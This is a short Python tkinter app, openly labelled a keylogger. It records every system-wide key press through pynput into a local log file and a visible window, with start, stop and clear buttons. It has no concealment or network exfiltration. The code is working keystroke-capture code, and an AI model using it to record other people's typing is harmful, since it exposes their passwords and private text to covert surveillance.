import tkinter as tk
from tkinter import scrolledtext
from pynput.keyboard import Listener, Key
import threading
import logging
from datetime import datetime
import os

# Initialize the log file and log configuration
log_file = "key_log_gui_custom.txt"
running = False  # To track if the keylogger is active
listener = None  # Listener variable

# Setting up logging configuration
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

# Function to capture key presses and log them
def on_press(key):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")[:-3]
    try:
        # Check if the key is a special key (e.g., space, enter, shift)
        if hasattr(key, 'char') and key.char is not None:
            key_log = f"{current_time}: Key pressed: {key.char}"
        else:
            key_log = f"{current_time}: Special key pressed: {key}"
        
        # Log to file
        logging.info(key_log)
        # Log to GUI output area
        log_output.insert(tk.END, key_log + "\n")
        log_output.yview(tk.END)

    except Exception as e:
        print(f"Error: {e}")

# Function to start the keylogger
def start_keylogger():
    global running, listener
    if not running:
        running = True
        start_button.config(state=tk.DISABLED)
        stop_button.config(state=tk.NORMAL)
        log_output.insert(tk.END, "Keylogger started...\n")
        listener = Listener(on_press=on_press)
        listener.start()

# Function to stop the keylogger
def stop_keylogger():
    global running, listener
    if running:
        running = False
        if listener is not None:
            listener.stop()
        start_button.config(state=tk.NORMAL)
        stop_button.config(state=tk.DISABLED)
        log_output.insert(tk.END, "Keylogger stopped...\n")

# Function to clear the logs
def clear_log():
    if os.path.exists(log_file):
        open(log_file, 'w').close()
    log_output.delete(1.0, tk.END)
    log_output.insert(tk.END, "Log cleared...\n")

# Create the main application window
app = tk.Tk()
app.title("Enhanced Keylogger GUI")
app.geometry("500x400")
app.resizable(False, False)

# GUI Elements

# Scrollable text area for displaying logs
log_output = scrolledtext.ScrolledText(app, width=60, height=15)
log_output.pack(pady=10)

# Start button
start_button = tk.Button(app, text="Start Keylogger", width=20, command=start_keylogger)
start_button.pack(pady=5)

# Stop button
stop_button = tk.Button(app, text="Stop Keylogger", width=20, command=stop_keylogger, state=tk.DISABLED)
stop_button.pack(pady=5)

# Clear log button
clear_button = tk.Button(app, text="Clear Log", width=20, command=clear_log)
clear_button.pack(pady=5)

# Run the application loop
app.mainloop()
